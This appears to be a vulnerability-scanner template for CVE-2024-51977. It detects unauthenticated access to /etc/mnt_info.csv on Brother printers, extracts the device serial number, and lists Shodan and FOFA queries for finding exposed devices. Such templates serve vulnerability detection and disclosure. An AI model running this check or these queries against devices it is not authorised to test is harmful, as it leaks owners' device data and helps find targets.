id: CVE-2024-51977

info:
  name: BrotherVulnerabilities - Information Disclosure
  severity: high
  author: darses
  description: |
    An unauthenticated attacker who can access either the HTTP service (TCP port 80), the HTTPS service (TCP port 443), or the IPP service (TCP port 631), can leak several pieces of sensitive information from a vulnerable device. The URI path /etc/mnt_info.csv can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the deviceâ€™s model, firmware version, IP address, and serial number.
  metadata:
    shodan-query:
      - title:"Brother"
      - html:"/common/js/lcddisplay.js"
      - location:"/general/status.html"
      - title:"DocuPrint"
    fofa-query:
      - title="Brother"
      - body="/common/js/lcddisplay.js"
      - body="/general/status.html"
      - title="DocuPrint"
    reference:
      - https://www.rapid7.com/blog/post/multiple-brother-devices-multiple-vulnerabilities-fixed/
      - https://www.cve.org/CVERecord?id=CVE-2024-51977
  tags: detect,cve,cve2024,brother,printer

http:
  - method: GET
    path:
      - "{{BaseURL}}/etc/mnt_info.csv"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "Content-Type: text/comma-separated-values"

      - type: word
        part: body
        words:
          - "Serial No."

    extractors:
      - type: regex
        name: serial
        group: 6
        regex:
          - '\n"([\w\s\d]+)","([\w\s\-]+)","([^"]*)","([^"]*)","([\d\.\:]*)","([\d\w]+)"'
